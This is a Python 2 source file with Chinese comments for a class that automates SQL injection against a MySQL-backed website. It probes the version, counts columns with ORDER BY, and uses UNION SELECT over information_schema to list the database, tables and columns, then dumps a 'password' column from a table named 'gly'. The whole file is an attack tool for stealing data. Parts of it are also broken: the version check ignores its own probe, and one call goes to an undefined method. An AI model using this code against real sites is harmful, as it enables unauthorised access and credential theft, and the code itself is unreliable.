#coding:gb2312
import urllib
import string
import binascii
import re

class mysqlInject():
    def __init__(self,url):
        self.db='database()'
        self.url=url  #待检测的网址
        self.dblen=0  #数据库的长度
        self.counts=0 #字段数
        self.tables=[] #表
        self.dbname=''

    # 检测数据库的版本
    def judgeVersion(self):
        page=urllib.urlopen(self.url).read()
        sql=string.join([self.url,"%20and%20mid(version(),1,1)=523%"],'')
        pagex=urllib.urlopen(self.url).read()
        if page==pagex:
            print ('MYSQL版本:>5')
        else:
            print ('MYSQL版本<5')

    #检测字段数
    def columnCounts(self):
        page=urllib.urlopen(self.url).read()
        for n in range(1,100):
            sql=string.join([self.url,"%20order%20by%20",str(n)],'')
            pagex=urllib.urlopen(sql).read()
            if n==1:
                if page==pagex:
                    print ('可以使用 order by 猜解')
                else:
                    print ('不能使用order by 猜解')
                    break
            else:
                if page!=pagex:
                    self.counts=n-1
                    print ('字段数:',self.counts)
                    break
        if self.counts==0:
            print ('未能猜解出字段数!')

    #爆出当前数据库名,数据库用户
    def inject5Content(self,sql):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+=sql
            url+=',0x25)'
        pagec=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            return strings

    def inject5TableNames(self,DB):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+='group_concat(distinct+table_name)'
            url+=',0x25)'
        url+='%20from%20information_schema.columns%20where%20table_schema='
        url+=DB
        pagec=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            s=strings.split(',')
            return s

    #猜解字段名
    def inject5ColumnsName(self,TB):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+='group_concat(distinct+column_name)'
            url+=',0x25)'
        url+='%20from%20information_schema.columns%20where%20table_name='
        url+=TB
        pagec=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            s=strings.split(',')
            return s

    #猜字段内容
    def inject5CountContent(self,TN,CN):
        url=self.url+'%20and%201=2%20UNION%20SELECT%20'
        for x in range(1,self.counts+1):
            if x!=1:
                url+=','
            url+='concat(0x25,'
            url+=CN
            url+=',0x25)'
        url+='%20from%20'
        url+=TN
        pagex=urllib.urlopen(url).read()
        reg="%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagex)
        if len(result)!=0:
            strings=result[1]
            strings=strings[1:len(strings)-1]
            print  (CN,':',strings)

    #如果数据库的版本大于4,可以使用'查'表的方法注入
    def inject5(self):
        d='database()'
        self.database=self.inject5Content(d)
        print (self.database)
        database0x=binascii.b2a_hex(self.database)
        database0x='0x'+database0x
        print (database0x)
        self.inject5TableName(database0x)
        self.inject5TableNames(database0x)
        tb=self.tables[0]
        print ('')
        tb=binascii.b2a_hex(tb)
        tb='0x'+tb
        print (tb)
        self.inject5ColumnsName(tb)
        self.inject5CountContent('gly','password')